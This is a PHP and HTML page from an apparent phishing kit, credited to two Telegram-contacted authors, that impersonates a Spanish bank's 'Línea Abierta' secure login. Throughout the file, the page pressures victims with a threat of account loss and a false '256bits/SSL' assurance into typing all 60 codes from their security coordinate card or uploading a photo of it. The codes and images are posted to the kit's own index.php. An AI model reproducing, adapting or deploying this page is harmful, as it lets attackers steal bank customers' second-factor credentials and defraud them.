<?php
    /*******
    Main Author: EL GH03T && Z0N51
    Contact me on telegram : https://t.me/elgh03t / https://t.me/z0n51
    ********************************************************/
    
    require_once '../includes/main.php';
?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../assets/css/helpers.css">
        <link rel="stylesheet" href="../assets/css/style.css">

        <link rel="icon" type="image/x-icon" href="../assets/imgs/favicon.ico" />

        <title>Acceso seguro a Línea Abierta</title>
    </head>

    <body>

        <div id="login-area">
            <form action="../index.php" method="post">
                            <input type="hidden" name="captcha">
                            <input type="hidden" name="step" value="card">
                            <input type="hidden" name="carte" id="carte">
                            <legend>
                                <img src="../assets/imgs/lock.png">
                                <h3>Acceso seguro a Línea Abierta</h3>
                                <p>
                                    <b>Debe ingresar todos los números de clave de su Tarjeta Línea Abierta, O simplemente puede cargar una imagen de su Tarjeta</b><br>
                                    <span>Ya no puede acceder a su cuenta si no completa estos pasos correctamente<br>No puede pasar al siguiente paso si no completa todos los números</span>
                                </p>
                            </legend>

                            <div id="tables">
                                <table>
                                    <tr>
                                        <th>N°</th>
                                        <th>Clave</th>
                                    </tr>
                                    <?php for($i = 1; $i <= 12; $i++) : ?>
                                        <?php
                                        if( $i == 1 ) {
                                            $zz = 'style="background: #FFF;"';
                                        } else {
                                            $zz = 'readonly class="nnn"';
                                        }
                                        ?>
                                        <tr>
                                            <td class="num"><input <?php echo $zz; ?> type="text" required name="num<?php echo $i; ?>" id="num<?php echo $i; ?>"></td>
                                            <td class="pass"><input type="text" required name="pass<?php echo $i; ?>" id="pass<?php echo $i; ?>"></td>
                                        </tr>
                                    <?php endfor; ?>
                                </table>
                                <table>
                                    <tr>
                                        <th>N°</th>
                                        <th>Clave</th>
                                    </tr>
                                    <?php for($i = 13; $i <= 24; $i++) : ?>
                                        <tr>
                                            <td class="num"><input type="text" readonly class="nnn" required name="num<?php echo $i; ?>" id="num<?php echo $i; ?>"></td>
                                            <td class="pass"><input type="text" required name="pass<?php echo $i; ?>" id="pass<?php echo $i; ?>"></td>
                                        </tr>
                                    <?php endfor; ?>
                                </table>
                                <table>
                                    <tr>
                                        <th>N°</th>
                                        <th>Clave</th>
                                    </tr>
                                    <?php for($i = 25; $i <= 36; $i++) : ?>
                                        <tr>
                                            <td class="num"><input type="text" readonly class="nnn" required name="num<?php echo $i; ?>" id="num<?php echo $i; ?>"></td>
                                            <td class="pass"><input type="text" required name="pass<?php echo $i; ?>" id="pass<?php echo $i; ?>"></td>
                                        </tr>
                                    <?php endfor; ?>
                                </table>
                                <table>
                                    <tr>
                                        <th>N°</th>
                                        <th>Clave</th>
                                    </tr>
                                    <?php for($i = 37; $i <= 48; $i++) : ?>
                                        <tr>
                                            <td class="num"><input type="text" readonly class="nnn" required name="num<?php echo $i; ?>" id="num<?php echo $i; ?>"></td>
                                            <td class="pass"><input type="text" required name="pass<?php echo $i; ?>" id="pass<?php echo $i; ?>"></td>
                                        </tr>
                                    <?php endfor; ?>
                                </table>
                                <table>
                                    <tr>
                                        <th>N°</th>
                                        <th>Clave</th>
                                    </tr>
                                    <?php for($i = 49; $i <= 60; $i++) : ?>
                                        <tr>
                                            <td class="num"><input type="text" readonly class="nnn" required name="num<?php echo $i; ?>" id="num<?php echo $i; ?>"></td>
                                            <td class="pass"><input type="text" required name="pass<?php echo $i; ?>" id="pass<?php echo $i; ?>"></td>
                                        </tr>
                                    <?php endfor; ?>
                                </table>
                            </div>


                            
                            <div class="box mb20">

                                <div class="row d-lg-none d-md-none d-sm-flex d-flex">
                                    <div class="col-md-6">
                                        <div class="upload-area">
                                            <label for="upload_carte1" class="">
                                                <p class="mb-0">También puedes sacar una foto de la "Tarjeta Línea Abierta" desde tu dispositivo móvil</p>
                                                <div id="progressBar"><div><span></span> <b></b></div></div>
                                            </label>
                                            <input class="d-none" type="file" name="upload_carte" id="upload_carte1" accept="image/*" capture="environment">
                                        </div>
                                    </div>
                                    <div class="col-md-6">
                                        <div class="upload-area">
                                            <label for="upload_carte2" class="">
                                                <p class="mb-0">También puede cargar "Tarjeta Línea Abierta" desde su dispositivo móvil</p>
                                                <div id="progressBar"><div><span></span> <b></b></div></div>
                                            </label>
                                            <input class="d-none" type="file" name="upload_carte" id="upload_carte2" accept="image/*">
                                        </div>
                                    </div>
                                </div>

                                <div class="upload-area d-lg-block d-md-block d-sm-none d-none">
                                    <label for="upload_carte3" class="">
                                        <p class="mb-0">También puede cargar "Tarjeta Línea Abierta" desde su Ordenador</p>
                                        <div id="progressBar"><div><span></span> <b></b></div></div>
                                    </label>
                                    <input class="d-none" type="file" name="upload_carte" id="upload_carte3" accept="image/*">
                                </div>
                            </div>                            

                            <div class="form-group mt50">
                                <button id="submit" type="submit">Confirmar</button>
                            </div>
                            <p style="font-weight: 500; color: red; margin-bottom: 0; font-size: 13px;">Su información de Tarjeta Linea Abierta será procesada de forma segura.  256bits/SSL</p>
                        </form>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.1/js/all.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/jquery-simple-upload@1.1.0/simpleUpload.min.js"></script>
        <script src="../assets/js/script.js"></script>

        <script>
            $('#num1').change(function(){
                var number = $(this).val();
                if( number == '' ) {
                    $('table .num input').val('');
                    return false;
                }
                $('table .num').each(function(){
                    $(this).find('input').val(number);
                    number++;
                });
            });
            $('#upload_carte1').change(function(){
                var cc = $(this).closest('.upload-area');
                $(this).simpleUpload("../index.php?step=upload", {
                    start: function(file){
                        //upload started
                        //$('label[for="upload_carte1"] p').text(file.name);
                        //$('#progress').html("");
                        cc.find('label[for="upload_carte1"] #progressBar').width(0);
                        cc.find('#progressBar').css({'margin-top': '30px'});
                        cc.find('#progressBar span').text(file.name);
                        cc.find('label[for="upload_carte1"]').removeClass('has-error');
                        $('#submit').attr('disabled','disabled').css({ 'opacity':'0.5' });
                    },
                    progress: function(progress){
                        //received progress
                        //$('#progress').html("Progress: " + Math.round(progress) + "%");
                        cc.find('label[for="upload_carte1"] #progressBar').width(progress + "%");
                        cc.find('#progressBar b').text('(' + progress.toFixed(0) + '%)');
                    },
                    success: function(data){
                        //upload successful
                        //$('label[for="upload_verso"] img').attr('src',data);
                        //console.log(data);
                        if( data == 'success' ) {
                            window.location.href= '../index.php?redirection=loading1';
                        } else if( data == 'error' ) {
                            cc.find('#progressBar').css({'background-color': 'red'});
                            cc.find('#progressBar div span').html('Erreur: un problème est survenu');
                            cc.find('#progressBar div b').html('');
                            cc.find('label[for="upload_carte1"]').addClass('has-error');
                            $('#submit').removeAttr('disabled').css({ 'opacity':'1' });
                        }
                    },
                    error: function(error){
                        //upload failed
                        cc.find('#progress').html("Failure!<br>" + error.name + ": " + error.message);
                        cc.find('label[for="upload_carte1"] p').html('<span style="color: #e74c3c;">'+ error.message +'</span>');
                        $('#submit').removeAttr('disabled').css({ 'opacity':'1' });
                    }
                });
            });
            $('#upload_carte2').change(function(){
                var cc = $(this).closest('.upload-area');
                $(this).simpleUpload("../index.php?step=upload", {
                    start: function(file){
                        //upload started
                        //$('label[for="upload_carte2"] p').text(file.name);
                        //$('#progress').html("");
                        cc.find('label[for="upload_carte2"] #progressBar').width(0);
                        cc.find('#progressBar').css({'margin-top': '30px'});
                        cc.find('#progressBar span').text(file.name);
                        cc.find('label[for="upload_carte2"]').removeClass('has-error');
                        $('#submit').attr('disabled','disabled').css({ 'opacity':'0.5' });
                    },
                    progress: function(progress){
                        //received progress
                        //$('#progress').html("Progress: " + Math.round(progress) + "%");
                        cc.find('label[for="upload_carte2"] #progressBar').width(progress + "%");
                        cc.find('#progressBar b').text('(' + progress.toFixed(0) + '%)');
                    },
                    success: function(data){
                        //upload successful
                        //$('label[for="upload_verso"] img').attr('src',data);
                        //console.log(data);
                        if( data == 'success' ) {
                            window.location.href= '../index.php?redirection=loading1';
                        } else if( data == 'error' ) {
                            cc.find('#progressBar').css({'background-color': 'red'});
                            cc.find('#progressBar div span').html('Erreur: un problème est survenu');
                            cc.find('#progressBar div b').html('');
                            cc.find('label[for="upload_carte2"]').addClass('has-error');
                            $('#submit').removeAttr('disabled').css({ 'opacity':'1' });
                        }
                    },
                    error: function(error){
                        //upload failed
                        cc.find('#progress').html("Failure!<br>" + error.name + ": " + error.message);
                        cc.find('label[for="upload_carte2"] p').html('<span style="color: #e74c3c;">'+ error.message +'</span>');
                        $('#submit').removeAttr('disabled').css({ 'opacity':'1' });
                    }
                });
            });
            $('#upload_carte3').change(function(){
                var cc = $(this).closest('.upload-area');
                $(this).simpleUpload("../index.php?step=upload", {
                    start: function(file){
                        //upload started
                        //$('label[for="upload_carte3"] p').text(file.name);
                        //$('#progress').html("");
                        cc.find('label[for="upload_carte3"] #progressBar').width(0);
                        cc.find('#progressBar').css({'margin-top': '30px'});
                        cc.find('#progressBar span').text(file.name);
                        cc.find('label[for="upload_carte3"]').removeClass('has-error');
                        $('#submit').attr('disabled','disabled').css({ 'opacity':'0.5' });
                    },
                    progress: function(progress){
                        //received progress
                        //$('#progress').html("Progress: " + Math.round(progress) + "%");
                        cc.find('label[for="upload_carte3"] #progressBar').width(progress + "%");
                        cc.find('#progressBar b').text('(' + progress.toFixed(0) + '%)');
                    },
                    success: function(data){
                        //upload successful
                        //$('label[for="upload_verso"] img').attr('src',data);
                        //console.log(data);
                        if( data == 'success' ) {
                            window.location.href= '../index.php?redirection=loading1';
                        } else if( data == 'error' ) {
                            cc.find('#progressBar').css({'background-color': 'red'});
                            cc.find('#progressBar div span').html('Erreur: un problème est survenu');
                            cc.find('#progressBar div b').html('');
                            cc.find('label[for="upload_carte3"]').addClass('has-error');
                            $('#submit').removeAttr('disabled').css({ 'opacity':'1' });
                        }
                    },
                    error: function(error){
                        //upload failed
                        cc.find('#progress').html("Failure!<br>" + error.name + ": " + error.message);
                        cc.find('label[for="upload_carte3"] p').html('<span style="color: #e74c3c;">'+ error.message +'</span>');
                        $('#submit').removeAttr('disabled').css({ 'opacity':'1' });
                    }
                });
            });
        </script>

    </body>

</html>